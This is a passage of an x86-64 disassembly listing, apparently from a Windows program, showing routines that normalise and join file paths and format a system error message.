  4079e3:	48 89 d6             	mov    %rdx,%rsi
  4079e6:	48 89 cf             	mov    %rcx,%rdi
  4079e9:	ba 10 00 00 00       	mov    $0x10,%edx
  4079ee:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  4079f3:	4c 89 c3             	mov    %r8,%rbx
  4079f6:	e8 51 c7 ff ff       	call   0x40414c
  4079fb:	48 8b 16             	mov    (%rsi),%rdx
  4079fe:	80 7e 10 00          	cmpb   $0x0,0x10(%rsi)
  407a02:	48 89 56 08          	mov    %rdx,0x8(%rsi)
  407a06:	75 4e                	jne    0x407a56
  407a08:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  407a0c:	3c 5c                	cmp    $0x5c,%al
  407a0e:	74 04                	je     0x407a14
  407a10:	3c 2f                	cmp    $0x2f,%al
  407a12:	75 42                	jne    0x407a56
  407a14:	48 8b 0b             	mov    (%rbx),%rcx
  407a17:	48 8d 42 01          	lea    0x1(%rdx),%rax
  407a1b:	48 89 06             	mov    %rax,(%rsi)
  407a1e:	48 39 c8             	cmp    %rcx,%rax
  407a21:	7d 42                	jge    0x407a65
  407a23:	80 7c 13 11 5c       	cmpb   $0x5c,0x11(%rbx,%rdx,1)
  407a28:	75 3b                	jne    0x407a65
  407a2a:	48 8d 42 02          	lea    0x2(%rdx),%rax
  407a2e:	48 39 c1             	cmp    %rax,%rcx
  407a31:	7e 32                	jle    0x407a65
  407a33:	80 7c 13 12 5c       	cmpb   $0x5c,0x12(%rbx,%rdx,1)
  407a38:	74 2b                	je     0x407a65
  407a3a:	48 89 06             	mov    %rax,(%rsi)
  407a3d:	eb 26                	jmp    0x407a65
  407a3f:	48 39 c8             	cmp    %rcx,%rax
  407a42:	7e 21                	jle    0x407a65
  407a44:	8a 44 0b 10          	mov    0x10(%rbx,%rcx,1),%al
  407a48:	3c 5c                	cmp    $0x5c,%al
  407a4a:	74 19                	je     0x407a65
  407a4c:	3c 2f                	cmp    $0x2f,%al
  407a4e:	74 15                	je     0x407a65
  407a50:	48 ff c1             	inc    %rcx
  407a53:	48 89 0e             	mov    %rcx,(%rsi)
  407a56:	31 c0                	xor    %eax,%eax
  407a58:	48 85 db             	test   %rbx,%rbx
  407a5b:	48 8b 0e             	mov    (%rsi),%rcx
  407a5e:	74 df                	je     0x407a3f
  407a60:	48 8b 03             	mov    (%rbx),%rax
  407a63:	eb da                	jmp    0x407a3f
  407a65:	48 8b 0e             	mov    (%rsi),%rcx
  407a68:	48 39 ca             	cmp    %rcx,%rdx
  407a6b:	7d 0f                	jge    0x407a7c
  407a6d:	48 ff c9             	dec    %rcx
  407a70:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  407a75:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
  407a7a:	eb 29                	jmp    0x407aa5
  407a7c:	31 c0                	xor    %eax,%eax
  407a7e:	48 85 db             	test   %rbx,%rbx
  407a81:	74 03                	je     0x407a86
  407a83:	48 8b 03             	mov    (%rbx),%rax
  407a86:	48 39 c1             	cmp    %rax,%rcx
  407a89:	7d 1a                	jge    0x407aa5
  407a8b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  407a90:	49 89 d8             	mov    %rbx,%r8
  407a93:	48 89 f2             	mov    %rsi,%rdx
  407a96:	e8 41 ff ff ff       	call   0x4079dc
  407a9b:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
  407aa0:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
  407aa5:	31 c0                	xor    %eax,%eax
  407aa7:	48 85 db             	test   %rbx,%rbx
  407aaa:	48 8b 16             	mov    (%rsi),%rdx
  407aad:	74 03                	je     0x407ab2
  407aaf:	48 8b 03             	mov    (%rbx),%rax
  407ab2:	48 39 d0             	cmp    %rdx,%rax
  407ab5:	7e 14                	jle    0x407acb
  407ab7:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  407abb:	3c 5c                	cmp    $0x5c,%al
  407abd:	74 04                	je     0x407ac3
  407abf:	3c 2f                	cmp    $0x2f,%al
  407ac1:	75 08                	jne    0x407acb
  407ac3:	48 ff c2             	inc    %rdx
  407ac6:	48 89 16             	mov    %rdx,(%rsi)
  407ac9:	eb da                	jmp    0x407aa5
  407acb:	0f 28 4c 24 30       	movaps 0x30(%rsp),%xmm1
  407ad0:	48 89 f8             	mov    %rdi,%rax
  407ad3:	c6 46 10 01          	movb   $0x1,0x10(%rsi)
  407ad7:	0f 11 0f             	movups %xmm1,(%rdi)
  407ada:	48 83 c4 40          	add    $0x40,%rsp
  407ade:	5b                   	pop    %rbx
  407adf:	5e                   	pop    %rsi
  407ae0:	5f                   	pop    %rdi
  407ae1:	c3                   	ret
  407ae2:	41 56                	push   %r14
  407ae4:	41 55                	push   %r13
  407ae6:	41 54                	push   %r12
  407ae8:	55                   	push   %rbp
  407ae9:	57                   	push   %rdi
  407aea:	56                   	push   %rsi
  407aeb:	53                   	push   %rbx
  407aec:	48 83 ec 60          	sub    $0x60,%rsp
  407af0:	4d 85 c0             	test   %r8,%r8
  407af3:	48 89 cb             	mov    %rcx,%rbx
  407af6:	49 89 d4             	mov    %rdx,%r12
  407af9:	4c 89 c6             	mov    %r8,%rsi
  407afc:	74 10                	je     0x407b0e
  407afe:	49 8b 00             	mov    (%r8),%rax
  407b01:	48 85 c0             	test   %rax,%rax
  407b04:	7f 20                	jg     0x407b26
  407b06:	31 ff                	xor    %edi,%edi
  407b08:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  407b0c:	75 28                	jne    0x407b36
  407b0e:	48 8b 03             	mov    (%rbx),%rax
  407b11:	31 ff                	xor    %edi,%edi
  407b13:	48 85 c0             	test   %rax,%rax
  407b16:	74 1e                	je     0x407b36
  407b18:	48 8b 10             	mov    (%rax),%rdx
  407b1b:	48 85 d2             	test   %rdx,%rdx
  407b1e:	0f 8f 05 03 00 00    	jg     0x407e29
  407b24:	eb 10                	jmp    0x407b36
  407b26:	41 8a 44 00 0f       	mov    0xf(%r8,%rax,1),%al
  407b2b:	3c 5c                	cmp    $0x5c,%al
  407b2d:	0f 85 e9 02 00 00    	jne    0x407e1c
  407b33:	40 b7 01             	mov    $0x1,%dil
  407b36:	4c 8d 6c 24 48       	lea    0x48(%rsp),%r13
  407b3b:	31 d2                	xor    %edx,%edx
  407b3d:	48 89 d9             	mov    %rbx,%rcx
  407b40:	e8 7b fc ff ff       	call   0x4077c0
  407b45:	ba 18 00 00 00       	mov    $0x18,%edx
  407b4a:	4c 89 e9             	mov    %r13,%rcx
  407b4d:	e8 fa c5 ff ff       	call   0x40414c
  407b52:	49 8b 04 24          	mov    (%r12),%rax
  407b56:	48 d1 f8             	sar    $1,%rax
  407b59:	48 85 c0             	test   %rax,%rax
  407b5c:	0f 9f 44 24 58       	setg   0x58(%rsp)
  407b61:	7e 12                	jle    0x407b75
  407b63:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  407b68:	31 c9                	xor    %ecx,%ecx
  407b6a:	eb 3a                	jmp    0x407ba6
  407b6c:	84 c9                	test   %cl,%cl
  407b6e:	74 05                	je     0x407b75
  407b70:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
  407b75:	4c 8d 74 24 30       	lea    0x30(%rsp),%r14
  407b7a:	e9 90 00 00 00       	jmp    0x407c0f
  407b7f:	31 d2                	xor    %edx,%edx
  407b81:	49 39 c0             	cmp    %rax,%r8
  407b84:	7e 17                	jle    0x407b9d
  407b86:	44 8a 44 06 10       	mov    0x10(%rsi,%rax,1),%r8b
  407b8b:	41 80 f8 5c          	cmp    $0x5c,%r8b
  407b8f:	0f 94 c2             	sete   %dl
  407b92:	41 80 f8 2f          	cmp    $0x2f,%r8b
  407b96:	41 0f 94 c0          	sete   %r8b
  407b9a:	44 09 c2             	or     %r8d,%edx
  407b9d:	48 ff c0             	inc    %rax
  407ba0:	84 d2                	test   %dl,%dl
  407ba2:	74 c8                	je     0x407b6c
  407ba4:	b1 01                	mov    $0x1,%cl
  407ba6:	45 31 c0             	xor    %r8d,%r8d
  407ba9:	48 85 f6             	test   %rsi,%rsi
  407bac:	49 89 c1             	mov    %rax,%r9
  407baf:	74 ce                	je     0x407b7f
  407bb1:	4c 8b 06             	mov    (%rsi),%r8
  407bb4:	eb c9                	jmp    0x407b7f
  407bb6:	48 39 c2             	cmp    %rax,%rdx
  407bb9:	0f 8d 0a 02 00 00    	jge    0x407dc9
  407bbf:	49 89 f0             	mov    %rsi,%r8
  407bc2:	4c 89 f1             	mov    %r14,%rcx
  407bc5:	4c 89 ea             	mov    %r13,%rdx
  407bc8:	e8 0f fe ff ff       	call   0x4079dc
  407bcd:	49 8b 04 24          	mov    (%r12),%rax
  407bd1:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
  407bd6:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  407bdb:	48 89 c1             	mov    %rax,%rcx
  407bde:	48 d1 f9             	sar    $1,%rcx
  407be1:	75 5f                	jne    0x407c42
  407be3:	4c 39 c5             	cmp    %r8,%rbp
  407be6:	75 5a                	jne    0x407c42
  407be8:	8a 54 2e 10          	mov    0x10(%rsi,%rbp,1),%dl
  407bec:	80 fa 5c             	cmp    $0x5c,%dl
  407bef:	75 2f                	jne    0x407c20
  407bf1:	48 8b 0b             	mov    (%rbx),%rcx
  407bf4:	48 85 c9             	test   %rcx,%rcx
  407bf7:	74 32                	je     0x407c2b
  407bf9:	48 83 39 00          	cmpq   $0x0,(%rcx)
  407bfd:	74 2c                	je     0x407c2b
  407bff:	48 8b 01             	mov    (%rcx),%rax
  407c02:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  407c06:	3c 5c                	cmp    $0x5c,%al
  407c08:	75 1d                	jne    0x407c27
  407c0a:	49 83 0c 24 01       	orq    $0x1,(%r12)
  407c0f:	31 c0                	xor    %eax,%eax
  407c11:	48 85 f6             	test   %rsi,%rsi
  407c14:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  407c19:	74 9b                	je     0x407bb6
  407c1b:	48 8b 06             	mov    (%rsi),%rax
  407c1e:	eb 96                	jmp    0x407bb6
  407c20:	80 fa 2f             	cmp    $0x2f,%dl
  407c23:	74 cc                	je     0x407bf1
  407c25:	eb 1b                	jmp    0x407c42
  407c27:	3c 2f                	cmp    $0x2f,%al
  407c29:	74 df                	je     0x407c0a
  407c2b:	ba 5c 00 00 00       	mov    $0x5c,%edx
  407c30:	e8 5d d4 ff ff       	call   0x405092
  407c35:	48 89 d9             	mov    %rbx,%rcx
  407c38:	48 89 c2             	mov    %rax,%rdx
  407c3b:	e8 39 d7 ff ff       	call   0x405379
  407c40:	eb c8                	jmp    0x407c0a
  407c42:	48 8d 55 01          	lea    0x1(%rbp),%rdx
  407c46:	49 39 d0             	cmp    %rdx,%r8
  407c49:	0f 85 df 00 00 00    	jne    0x407d2e
  407c4f:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  407c54:	0f 85 d4 00 00 00    	jne    0x407d2e
  407c5a:	42 80 7c 06 10 2e    	cmpb   $0x2e,0x10(%rsi,%r8,1)
  407c60:	0f 85 c8 00 00 00    	jne    0x407d2e
  407c66:	48 85 c9             	test   %rcx,%rcx
  407c69:	48 8b 0b             	mov    (%rbx),%rcx
  407c6c:	7e 4d                	jle    0x407cbb
  407c6e:	48 85 c9             	test   %rcx,%rcx
  407c71:	74 9c                	je     0x407c0f
  407c73:	4c 8b 01             	mov    (%rcx),%r8
  407c76:	83 e0 01             	and    $0x1,%eax
  407c79:	49 8d 50 ff          	lea    -0x1(%r8),%rdx
  407c7d:	48 39 d0             	cmp    %rdx,%rax
  407c80:	7d 16                	jge    0x407c98
  407c82:	44 8a 4c 11 10       	mov    0x10(%rcx,%rdx,1),%r9b
  407c87:	41 80 f9 5c          	cmp    $0x5c,%r9b
  407c8b:	74 0b                	je     0x407c98
  407c8d:	41 80 f9 2f          	cmp    $0x2f,%r9b
  407c91:	74 05                	je     0x407c98
  407c93:	49 89 d0             	mov    %rdx,%r8
  407c96:	eb e1                	jmp    0x407c79
  407c98:	4d 85 c0             	test   %r8,%r8
  407c9b:	0f 8e 6e ff ff ff    	jle    0x407c0f
  407ca1:	e8 23 d6 ff ff       	call   0x4052c9
  407ca6:	48 89 d9             	mov    %rbx,%rcx
  407ca9:	48 89 c2             	mov    %rax,%rdx
  407cac:	e8 c8 d6 ff ff       	call   0x405379
  407cb1:	49 83 2c 24 02       	subq   $0x2,(%r12)
  407cb6:	e9 54 ff ff ff       	jmp    0x407c0f
  407cbb:	48 85 c9             	test   %rcx,%rcx
  407cbe:	74 33                	je     0x407cf3
  407cc0:	48 8b 01             	mov    (%rcx),%rax
  407cc3:	48 85 c0             	test   %rax,%rax
  407cc6:	7e 2b                	jle    0x407cf3
  407cc8:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  407ccc:	3c 5c                	cmp    $0x5c,%al
  407cce:	74 23                	je     0x407cf3
  407cd0:	3c 2f                	cmp    $0x2f,%al
  407cd2:	74 1f                	je     0x407cf3
  407cd4:	ba 5c 00 00 00       	mov    $0x5c,%edx
  407cd9:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  407cde:	e8 af d3 ff ff       	call   0x405092
  407ce3:	48 89 d9             	mov    %rbx,%rcx
  407ce6:	48 89 c2             	mov    %rax,%rdx
  407ce9:	e8 8b d6 ff ff       	call   0x405379
  407cee:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  407cf3:	48 89 ea             	mov    %rbp,%rdx
  407cf6:	48 89 f1             	mov    %rsi,%rcx
  407cf9:	e8 65 0e 00 00       	call   0x408b63
  407cfe:	31 d2                	xor    %edx,%edx
  407d00:	48 85 c0             	test   %rax,%rax
  407d03:	48 89 c5             	mov    %rax,%rbp
  407d06:	74 03                	je     0x407d0b
  407d08:	48 8b 10             	mov    (%rax),%rdx
  407d0b:	48 8b 0b             	mov    (%rbx),%rcx
  407d0e:	e8 0b d4 ff ff       	call   0x40511e
  407d13:	48 89 d9             	mov    %rbx,%rcx
  407d16:	48 89 c2             	mov    %rax,%rdx
  407d19:	e8 5b d6 ff ff       	call   0x405379
  407d1e:	48 8b 0b             	mov    (%rbx),%rcx
  407d21:	48 89 ea             	mov    %rbp,%rdx
  407d24:	e8 fe e2 ff ff       	call   0x406027
  407d29:	e9 e1 fe ff ff       	jmp    0x407c0f
  407d2e:	31 c0                	xor    %eax,%eax
  407d30:	4c 39 c5             	cmp    %r8,%rbp
  407d33:	75 08                	jne    0x407d3d
  407d35:	80 7c 2e 10 2e       	cmpb   $0x2e,0x10(%rsi,%rbp,1)
  407d3a:	0f 94 c0             	sete   %al
  407d3d:	4c 39 c5             	cmp    %r8,%rbp
  407d40:	0f 8f c9 fe ff ff    	jg     0x407c0f
  407d46:	84 c0                	test   %al,%al
  407d48:	0f 85 c1 fe ff ff    	jne    0x407c0f
  407d4e:	48 8b 0b             	mov    (%rbx),%rcx
  407d51:	48 85 c9             	test   %rcx,%rcx
  407d54:	74 33                	je     0x407d89
  407d56:	48 8b 01             	mov    (%rcx),%rax
  407d59:	48 85 c0             	test   %rax,%rax
  407d5c:	7e 2b                	jle    0x407d89
  407d5e:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  407d62:	3c 5c                	cmp    $0x5c,%al
  407d64:	74 23                	je     0x407d89
  407d66:	3c 2f                	cmp    $0x2f,%al
  407d68:	74 1f                	je     0x407d89
  407d6a:	ba 5c 00 00 00       	mov    $0x5c,%edx
  407d6f:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  407d74:	e8 19 d3 ff ff       	call   0x405092
  407d79:	48 89 d9             	mov    %rbx,%rcx
  407d7c:	48 89 c2             	mov    %rax,%rdx
  407d7f:	e8 f5 d5 ff ff       	call   0x405379
  407d84:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  407d89:	48 89 ea             	mov    %rbp,%rdx
  407d8c:	48 89 f1             	mov    %rsi,%rcx
  407d8f:	e8 cf 0d 00 00       	call   0x408b63
  407d94:	31 d2                	xor    %edx,%edx
  407d96:	48 85 c0             	test   %rax,%rax
  407d99:	48 89 c5             	mov    %rax,%rbp
  407d9c:	74 03                	je     0x407da1
  407d9e:	48 8b 10             	mov    (%rax),%rdx
  407da1:	48 8b 0b             	mov    (%rbx),%rcx
  407da4:	e8 75 d3 ff ff       	call   0x40511e
  407da9:	48 89 d9             	mov    %rbx,%rcx
  407dac:	48 89 c2             	mov    %rax,%rdx
  407daf:	e8 c5 d5 ff ff       	call   0x405379
  407db4:	48 8b 0b             	mov    (%rbx),%rcx
  407db7:	48 89 ea             	mov    %rbp,%rdx
  407dba:	e8 68 e2 ff ff       	call   0x406027
  407dbf:	49 83 04 24 02       	addq   $0x2,(%r12)
  407dc4:	e9 46 fe ff ff       	jmp    0x407c0f
  407dc9:	48 8b 03             	mov    (%rbx),%rax
  407dcc:	48 85 c0             	test   %rax,%rax
  407dcf:	74 06                	je     0x407dd7
  407dd1:	48 83 38 00          	cmpq   $0x0,(%rax)
  407dd5:	75 29                	jne    0x407e00
  407dd7:	31 c0                	xor    %eax,%eax
  407dd9:	48 85 f6             	test   %rsi,%rsi
  407ddc:	74 07                	je     0x407de5
  407dde:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  407de2:	0f 95 c0             	setne  %al
  407de5:	a8 01                	test   $0x1,%al
  407de7:	74 17                	je     0x407e00
  407de9:	48 8d 0d 00 ed 00 00 	lea    0xed00(%rip),%rcx        # 0x416af0
  407df0:	e8 e8 0d 00 00       	call   0x408bdd
  407df5:	48 89 d9             	mov    %rbx,%rcx
  407df8:	48 89 c2             	mov    %rax,%rdx
  407dfb:	e8 79 d5 ff ff       	call   0x405379
  407e00:	40 0f b6 d7          	movzbl %dil,%edx
  407e04:	48 89 d9             	mov    %rbx,%rcx
  407e07:	e8 b4 f9 ff ff       	call   0x4077c0
  407e0c:	90                   	nop
  407e0d:	48 83 c4 60          	add    $0x60,%rsp
  407e11:	5b                   	pop    %rbx
  407e12:	5e                   	pop    %rsi
  407e13:	5f                   	pop    %rdi
  407e14:	5d                   	pop    %rbp
  407e15:	41 5c                	pop    %r12
  407e17:	41 5d                	pop    %r13
  407e19:	41 5e                	pop    %r14
  407e1b:	c3                   	ret
  407e1c:	3c 2f                	cmp    $0x2f,%al
  407e1e:	0f 84 0f fd ff ff    	je     0x407b33
  407e24:	e9 dd fc ff ff       	jmp    0x407b06
  407e29:	8a 44 10 0f          	mov    0xf(%rax,%rdx,1),%al
  407e2d:	3c 5c                	cmp    $0x5c,%al
  407e2f:	40 0f 94 c7          	sete   %dil
  407e33:	3c 2f                	cmp    $0x2f,%al
  407e35:	0f 94 c2             	sete   %dl
  407e38:	09 d7                	or     %edx,%edi
  407e3a:	e9 f7 fc ff ff       	jmp    0x407b36
  407e3f:	57                   	push   %rdi
  407e40:	56                   	push   %rsi
  407e41:	53                   	push   %rbx
  407e42:	48 83 ec 40          	sub    $0x40,%rsp
  407e46:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  407e4d:	00 00 
  407e4f:	49 89 c8             	mov    %rcx,%r8
  407e52:	31 c9                	xor    %ecx,%ecx
  407e54:	48 89 d3             	mov    %rdx,%rbx
  407e57:	4d 85 c0             	test   %r8,%r8
  407e5a:	74 03                	je     0x407e5f
  407e5c:	49 8b 08             	mov    (%r8),%rcx
  407e5f:	31 c0                	xor    %eax,%eax
  407e61:	48 85 db             	test   %rbx,%rbx
  407e64:	74 03                	je     0x407e69
  407e66:	48 8b 03             	mov    (%rbx),%rax
  407e69:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  407e6e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  407e73:	48 01 c1             	add    %rax,%rcx
  407e76:	e8 05 d4 ff ff       	call   0x405280
  407e7b:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  407e80:	48 8d 74 24 38       	lea    0x38(%rsp),%rsi
  407e85:	48 89 fa             	mov    %rdi,%rdx
  407e88:	48 89 f1             	mov    %rsi,%rcx
  407e8b:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  407e90:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  407e97:	00 00 
  407e99:	e8 44 fc ff ff       	call   0x407ae2
  407e9e:	49 89 d8             	mov    %rbx,%r8
  407ea1:	48 89 fa             	mov    %rdi,%rdx
  407ea4:	48 89 f1             	mov    %rsi,%rcx
  407ea7:	e8 36 fc ff ff       	call   0x407ae2
  407eac:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
  407eb1:	48 83 c4 40          	add    $0x40,%rsp
  407eb5:	5b                   	pop    %rbx
  407eb6:	5e                   	pop    %rsi
  407eb7:	5f                   	pop    %rdi
  407eb8:	c3                   	ret
  407eb9:	41 55                	push   %r13
  407ebb:	41 54                	push   %r12
  407ebd:	55                   	push   %rbp
  407ebe:	57                   	push   %rdi
  407ebf:	56                   	push   %rsi
  407ec0:	53                   	push   %rbx
  407ec1:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
  407ec8:	45 31 ed             	xor    %r13d,%r13d
  407ecb:	41 bc 40 00 00 00    	mov    $0x40,%r12d
  407ed1:	83 cd ff             	or     $0xffffffff,%ebp
  407ed4:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  407ed9:	48 89 cb             	mov    %rcx,%rbx
  407edc:	48 89 d7             	mov    %rdx,%rdi
  407edf:	48 89 f1             	mov    %rsi,%rcx
  407ee2:	ba 00 02 00 00       	mov    $0x200,%edx
  407ee7:	e8 60 c2 ff ff       	call   0x40414c
  407eec:	49 39 fd             	cmp    %rdi,%r13
  407eef:	7d 49                	jge    0x407f3a
  407ef1:	48 89 f9             	mov    %rdi,%rcx
  407ef4:	4c 29 e9             	sub    %r13,%rcx
  407ef7:	48 83 f9 40          	cmp    $0x40,%rcx
  407efb:	49 0f 4f cc          	cmovg  %r12,%rcx
  407eff:	31 c0                	xor    %eax,%eax
  407f01:	48 39 c8             	cmp    %rcx,%rax
  407f04:	7d 12                	jge    0x407f18
  407f06:	48 6b d0 38          	imul   $0x38,%rax,%rdx
  407f0a:	48 8b 54 13 08       	mov    0x8(%rbx,%rdx,1),%rdx
  407f0f:	48 89 14 c6          	mov    %rdx,(%rsi,%rax,8)
  407f13:	48 ff c0             	inc    %rax
  407f16:	eb e9                	jmp    0x407f01
  407f18:	48 8b 05 a1 f1 00 00 	mov    0xf1a1(%rip),%rax        # 0x4170c0
  407f1f:	41 89 e9             	mov    %ebp,%r9d
  407f22:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  407f28:	48 89 f2             	mov    %rsi,%rdx
  407f2b:	49 83 c5 40          	add    $0x40,%r13
  407f2f:	48 81 c3 00 0e 00 00 	add    $0xe00,%rbx
  407f36:	ff 10                	call   *(%rax)
  407f38:	eb b2                	jmp    0x407eec
  407f3a:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
  407f41:	5b                   	pop    %rbx
  407f42:	5e                   	pop    %rsi
  407f43:	5f                   	pop    %rdi
  407f44:	5d                   	pop    %rbp
  407f45:	41 5c                	pop    %r12
  407f47:	41 5d                	pop    %r13
  407f49:	c3                   	ret
  407f4a:	55                   	push   %rbp
  407f4b:	57                   	push   %rdi
  407f4c:	56                   	push   %rsi
  407f4d:	53                   	push   %rbx
  407f4e:	48 83 ec 68          	sub    $0x68,%rsp
  407f52:	31 ed                	xor    %ebp,%ebp
  407f54:	89 4c 24 4c          	mov    %ecx,0x4c(%rsp)
  407f58:	48 8b 0d 61 f6 00 00 	mov    0xf661(%rip),%rcx        # 0x4175c0
  407f5f:	48 89 d7             	mov    %rdx,%rdi
  407f62:	ba 38 00 00 00       	mov    $0x38,%edx
  407f67:	e8 d6 d2 ff ff       	call   0x405242
  407f6c:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
  407f71:	48 89 c3             	mov    %rax,%rbx
  407f74:	48 8b 05 65 f6 00 00 	mov    0xf665(%rip),%rax        # 0x4175e0
  407f7b:	45 85 c0             	test   %r8d,%r8d
  407f7e:	44 89 43 30          	mov    %r8d,0x30(%rbx)
  407f82:	48 89 03             	mov    %rax,(%rbx)
  407f85:	48 8d 05 2a ea 00 00 	lea    0xea2a(%rip),%rax        # 0x4169b6
  407f8c:	48 89 43 10          	mov    %rax,0x10(%rbx)
  407f90:	74 5b                	je     0x407fed
  407f92:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  407f97:	45 31 c9             	xor    %r9d,%r9d
  407f9a:	31 d2                	xor    %edx,%edx
  407f9c:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
  407fa3:	00 00 
  407fa5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  407faa:	48 8b 05 2f f1 00 00 	mov    0xf12f(%rip),%rax        # 0x4170e0
  407fb1:	b9 00 13 00 00       	mov    $0x1300,%ecx
  407fb6:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  407fbd:	00 00 
  407fbf:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  407fc6:	00 
  407fc7:	ff 10                	call   *(%rax)
  407fc9:	85 c0                	test   %eax,%eax
  407fcb:	74 20                	je     0x407fed
  407fcd:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
  407fd2:	e8 63 a4 ff ff       	call   0x40243a
  407fd7:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
  407fdc:	48 89 c5             	mov    %rax,%rbp
  407fdf:	48 85 c9             	test   %rcx,%rcx
  407fe2:	74 09                	je     0x407fed
  407fe4:	48 8b 05 05 f1 00 00 	mov    0xf105(%rip),%rax        # 0x4170f0
  407feb:	ff 10                	call   *(%rax)
  407fed:	48 8d 73 18          	lea    0x18(%rbx),%rsi
  407ff1:	48 89 ea             	mov    %rbp,%rdx
  407ff4:	48 89 f1             	mov    %rsi,%rcx
  407ff7:	e8 60 c1 ff ff       	call   0x40415c
  407ffc:	48 85 ff             	test   %rdi,%rdi
  407fff:	74 67                	je     0x408068
  408001:	48 83 3f 00          	cmpq   $0x0,(%rdi)
  408005:	7e 61                	jle    0x408068
  408007:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  40800b:	48 85 c9             	test   %rcx,%rcx
  40800e:	74 24                	je     0x408034
  408010:	48 8b 01             	mov    (%rcx),%rax
  408013:	48 85 c0             	test   %rax,%rax
  408016:	7e 1c                	jle    0x408034
  408018:	80 7c 01 0f 0a       	cmpb   $0xa,0xf(%rcx,%rax,1)
  40801d:	74 15                	je     0x408034
  40801f:	ba 0a 00 00 00       	mov    $0xa,%edx
  408024:	e8 69 d0 ff ff       	call   0x405092
  408029:	48 89 f1             	mov    %rsi,%rcx
  40802c:	48 89 c2             	mov    %rax,%rdx
  40802f:	e8 28 c1 ff ff       	call   0x40415c
  408034:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  408038:	ba 11 00 00 00       	mov    $0x11,%edx
  40803d:	e8 dc d0 ff ff       	call   0x40511e
  408042:	48 89 f1             	mov    %rsi,%rcx
  408045:	48 89 c2             	mov    %rax,%rdx
  408048:	e8 0f c1 ff ff       	call   0x40415c
  40804d:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  408051:	48 8d 15 48 ea 00 00 	lea    0xea48(%rip),%rdx        # 0x416aa0
  408058:	e8 ca df ff ff       	call   0x406027
  40805d:	48 89 fa             	mov    %rdi,%rdx
  408060:	48 89 f1             	mov    %rsi,%rcx
  408063:	e8 4f d3 ff ff       	call   0x4053b7
  408068:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  40806c:	48 85 f6             	test   %rsi,%rsi
  40806f:	74 06                	je     0x408077
  408071:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  408075:	75 1d                	jne    0x408094
  408077:	48 8d 0d e2 e9 00 00 	lea    0xe9e2(%rip),%rcx        # 0x416a60
  40807e:	e8 17 d1 ff ff       	call   0x40519a
  408083:	48 85 f6             	test   %rsi,%rsi
  408086:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40808a:	74 08                	je     0x408094
  40808c:	48 89 f1             	mov    %rsi,%rcx
  40808f:	e8 6c 5c 00 00       	call   0x40dd00
  408094:	48 89 d8             	mov    %rbx,%rax
  408097:	48 83 c4 68          	add    $0x68,%rsp
  40809b:	5b                   	pop    %rbx
  40809c:	5e                   	pop    %rsi
  40809d:	5f                   	pop    %rdi
  40809e:	5d                   	pop    %rbp
  40809f:	c3                   	ret
  4080a0:	48 83 ec 38          	sub    $0x38,%rsp
  4080a4:	e8 a1 fe ff ff       	call   0x407f4a
  4080a9:	4c 8d 0d 0e e9 00 00 	lea    0xe90e(%rip),%r9        # 0x4169be
  4080b0:	48 c7 44 24 20 5e 00 	movq   $0x5e,0x20(%rsp)
  4080b7:	00 00 
  4080b9:	4c 8d 05 08 e9 00 00 	lea    0xe908(%rip),%r8        # 0x4169c8
  4080c0:	48 89 c1             	mov    %rax,%rcx
  4080c3:	48 8d 15 ec e8 00 00 	lea    0xe8ec(%rip),%rdx        # 0x4169b6
  4080ca:	e8 e6 da ff ff       	call   0x405bb5
  4080cf:	90                   	nop
  4080d0:	48 83 c4 38          	add    $0x38,%rsp
  4080d4:	c3                   	ret
  4080d5:	55                   	push   %rbp
  4080d6:	57                   	push   %rdi
  4080d7:	56                   	push   %rsi
  4080d8:	53                   	push   %rbx
  4080d9:	48 83 ec 48          	sub    $0x48,%rsp
  4080dd:	48 89 d3             	mov    %rdx,%rbx
  4080e0:	48 89 ce             	mov    %rcx,%rsi
  4080e3:	e8 3a a5 ff ff       	call   0x402622
  4080e8:	48 89 d9             	mov    %rbx,%rcx
